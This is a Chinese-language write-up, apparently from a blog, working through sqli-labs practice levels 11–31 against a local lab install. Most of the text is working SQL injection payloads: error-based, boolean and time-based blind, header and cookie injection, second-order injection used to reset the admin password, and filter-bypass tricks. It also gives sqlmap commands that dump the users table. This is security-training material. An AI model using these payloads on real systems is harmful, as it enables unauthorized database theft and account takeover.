进入POST注入\n看见登入框，为方便注入，bp启动\n单引号闭合且字段数为2\n联合注入\nsqlmap的POST运用 1、指定探测注入点 1 2 3 4 5 6 7 8 9 10 方式一 启动sqlmap探测注入点 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch 爆破当前数据库名 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch --current-db 爆破数据表 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security --tables 最后脱库 python sqlmap.py -u ip --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --batch -D security -T users - -dump 2、将抓包内容保存到.txt文件中 1 2 启动sqlmap python sqlmap.py -r txt文件位置 -p 要扫描的点 1 2 3 4 5 6 爆破数据库 python sqlmap.py -r .txt文件位置 -p 扫描的位置 --current-db 爆破表 python sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --tables 脱库 pyhton sqlmap.py -r .txt文件位置 -p 扫描的位置 -D security --dump less12 闭合方式为\u0026quot;),还是bp启动\n联合注入和报错注入都行\n采用extractvalue()函数报错注入 1 2 查询数据库表 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select database()),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 爆破数据表 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 爆破字段名 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 1 2 3 爆破字段 uname=-1\u0026#34;) or extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 用updatexml()函数进行报错注入 1 2 3 4 5 6 7 8 9 10 11 查询数据库表 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select database()),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破数据表 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 2,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段名 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 用floor()函数进行爆破 1 2 3 4 5 6 7 8 9 10 11 12 13 14 爆破数据库 uname=-1\u0026#34;) union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破数据表 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段表 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit less13 闭合方式改成‘），和less12一样\nless14 闭合方式改成\u0026quot;,和less12一样\nless15 通过图片回显闭合方式为单引号闭合\n正确的数据与错误数据页面回显的图片不一样，可以尝试一下布尔盲注\n1 uname=admin\u0026#39; and length(database())\u0026gt;=8--+\u0026amp;passwd=admin\u0026amp;submit=Submit 不猜了，直接sqlmap\nsqlmap梭less15 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --current-db 全选yes，直接爆破出时间盲注。\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump less16 闭合改为\u0026quot;),和less15一样\nless17 注入点变为密码的地方\nsqlmap梭less17 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt -p \u0026#34;passwd\u0026#34; -D security --dump less18 网页记录了本地ip的信息，说明可能是数据库记录了本机的信息，即后台获取了一些诸如Ip的信息保存到数据库中，并且页面返回了数据包user-agent的信息，那么在请求头中就可能存在注入点\n看源码\n源代码标识获取浏览器信息，即user-Agent部分，表示客户端通过什么浏览器向后台请求\n在后面的请求中也有将该部分进行存储添加到数据库，现在就可以通过一些手段在数据添加的同时进行注入\npayload改bp中uers-agent部分\n1 \u0026#39;and updatexml(1,concat(0x7e,database(),0x7e),1),1,1)# sqlmap头部注入 在头部注入爆破中，sqlmap需要提高扫描等级 level和risk\n1 2 3 level x(x为1-5) 当为2时会对头部的cookie进行扫描注入尝试，x\u0026gt;=3时队user-Agent,ip,referer 参数进行扫描 risk x(x 1-3) 1时进行大部分扫描 2会增加基于事件的测试语句 3会增加or语句的sql注入 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --level=3 --current-db 或者指定头部爆破\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --user-agent=\u0026#34;*\u0026#34; --thread=10 --dbs 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump 或者将数据包保存下来\n加上*号\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=4 -D security -T users --dump less19 这次改referer\nsqlmap直接梭\n1 2 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; --thread=10 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; -D security -T users --dump 或者数据包保存下来在referer后加*号\nless20 登入界面有明显提示，cookie注入\n知道字段数可以用floor函数进行报错注入\n1 2 爆破数据库名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 爆破表名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 爆破字段名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 4 爆破字段内容 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select username/password from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# sqlmap进行cookie注入 cookie注入时用level=2,在cookie后加*;\n1 2 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 -D security -T users --dump less21 登入进去发现cookie被加密了\n1 2 admin\u0026#39; and 1=1 order by 4# YWRtaW4nIGFuZCAxPTEgb3JkZXIgYnkgNCM= 看回显闭合方式是')\n报错注入\n1 2 3 4 admin\u0026#39;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)# base64加密 YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdl KSwxKSM= 后面跟前面一样爆破\nsqlmap进行加密注入 对进行加密注入的数据需要用到tamper模块\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; --current-db 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; -D security -T users --dump less22 闭合方式改为\u0026rsquo;\u0026rsquo;,其他跟less21一样\nless23 字符型注入但是注释符被过滤了\n#和\u0026ndash;+都被替换成空字符\n只有想方法将闭合符号消耗完毕，让后台能够接收，处理掉原有的闭合方式\n1 2 3 id=-1\u0026#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1 这样构造闭合的目的就是将原有单引号进行逃逸使查询语句变为 id=\u0026#39;-1\u0026#39; xxx and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; 最后的半个 单引号用于逃逸后台的闭合方式 sqlmap运用 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/sqli-labs/Less-23/?id=1 --batch -D security -T users --dump 无脑梭\nless24 二次注入 二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入\n到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，\n当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。简言之就是将\n脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，当下一次调用该数据时，该数据就会\n拼接到其他查询语句中造成注入。\n注册新账号，并登入\n修改密码,修改功能语句为\n1 UPDATE users SET passwd=\u0026#34;New_Pass\u0026#34; WHERE users=\u0026#39;admin\u0026#39; 因为\u0026rsquo;和后面的引号闭合，而#又把语句注释了，所以在这里修改密码就相当于在修改admin的密码，这时候我们就是在进行越权改变管理员的密码，从数据库中抽出我们注册的新账户，用该账户越权修改\n管理员的密码\n修改为1234\n登入admin账号\nless25 and和or都被过滤了\n解决思路将or变成oorr,这样后台过滤了or还剩下or或者用||代替or(and一样的方式)\n1 2 3 4 爆破数据库名 ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 或者 ?id=-1\u0026#39; || updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 1 2 3 4 爆破数据表 ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() ),0x7e),1)--+ 注意：information中也有or需要进行双写 后面都一样\nless25a 发现与Less25的区别是数字型注入\n联合注入\n1 2 3 4 5 6 7 8 9 查询数据表 ?id=-1 union select 1,database(),group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() --+ 查询字段名 ?id=-1 union select 1,database(),group_concat(column_name)from infoorrmation_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 查users id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd))from security.users--+ less26 发现and，空格，注释都没有了\n\\s过滤了空格和换行，解决and or可以双写或者用\u0026amp;\u0026amp;和||代替，解决注释需要强行\n闭合逃逸，需要空格的地方可以加上括号，白盒测试发现注入类型为字符型\n1 2 3 and or ——\u0026gt; \u0026amp;\u0026amp; || # -- ——\u0026gt; 闭合逃逸 /s ——\u0026gt; 括号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 payload ?id=-1\u0026#39;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破数据表 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_sc hema=database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破字段名 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_ name=\u0026#39;users\u0026#39;)),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破字段内容 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(concat_ws(username,0x3a,passwoorrd)))from(security.users)), 0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 less26a less26a过滤的东西与less26一致，通过测试发现闭合方式还是为单引号,并且没有报错的回显\n尝试盲注\n通过布尔盲注可以逐一猜解爆破\n盲注的板子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 盲注 ?id=1\u0026#39;and length((select database()))\u0026gt;9--+ #大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ #substr(\u0026#34;78909\u0026#34;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。 ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ 判断所有表名字符长度。 ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ 逐一判断表名 ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ 判断所有字段名的长度 ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ 逐一判断字段名。 ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ 判断字段内容长度 ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ 逐一检测内容。 时间盲注9 ?id=1\u0026#39; and if(1=1,sleep(5),1)--+ 判断参数构造。 ?id=1\u0026#39;and if(length((select database()))\u0026gt;9,sleep(5),1)--+ 判断数据库名长度 ?id=1\u0026#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+ 逐一判断数据库字符 ?id=1\u0026#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13,sleep(5),1)--+ 判断所有表名长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断表名 ?id=1\u0026#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20,sleep(5),1)--+ 判断所有字段名的长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断字段名。 ?id=1\u0026#39; and if(length((select group_concat(username,password) from users))\u0026gt;109,sleep(5),1)--+ 判断字段内容长度 ?id=1\u0026#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50,sleep(5),1)--+ 逐一检测内容。 less27 直接看源码\nselect,union这类关键词只过滤完全大写或者完全小写，针对php这种弱类型语言，可以采用部分大写\n部分小写绕过\n1 空格，换行——\u0026gt; %0a payload\n1 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 1 2 爆破数据表 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,(selEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a1,1),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 重写绕过\n1 2 3 4 5 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;security\u0026#39;))),1))or\u0026#39;0 爆表 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema=\u0026#39;security\u0026#39;and(table_name=\u0026#39;users\u0026#39;)))),1))or\u0026#39;0 爆字段 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or\u0026#39;0 爆密码账户 less27a 闭合方式改为\u0026quot;,其他和less27一样\nless28 查看源码\nunion select被匹配了，解决的办法就是绕过union select 即可，测试发现没有报错回显，闭合方式为')\n盲注\npayload(x是要猜的值)\n1 ?id=1\u0026#39;)and(length(database()))=x%0aand(\u0026#39;1\u0026#39;)=(\u0026#39;1 less28a 通过源码发现仅仅匹配了union select组合，其余都未匹配，与Less28一样，用盲注的方式\npayload\n1 ?id=1\u0026#39;) and length(database())=8--+ less29 HTTP参数污染\n1 2 3 4 服务器端有两个部分：第一部分是tomcat为引擎的jsp型服务器，第二部分是apache为引擎的php服务 器，真正提供web服务的是php服务器，往往在tomcat的服务器处做过滤处理，功能类似于waf，由于 解析参数的机制不同，我们可以利用该原理绕过waf的检测；数据解析的顺序：tomcat从前往后， apache从后往前。 此关的通关简单联合查询即可，目的是了解参数污染的原理\npayload\n1 2 ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;)--+ ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select concat_ws(username,0x7e,password)from security.users limit 0,1)--+ less30 与Less29的区别为闭合方式为双引号\nless31 与Less29的区别为闭合方式为双引号加括号\nless32 ","date":"2024-09-07T00:00:00Z","image":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1.png","permalink":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","title":"sqli-labs靶场练习"}]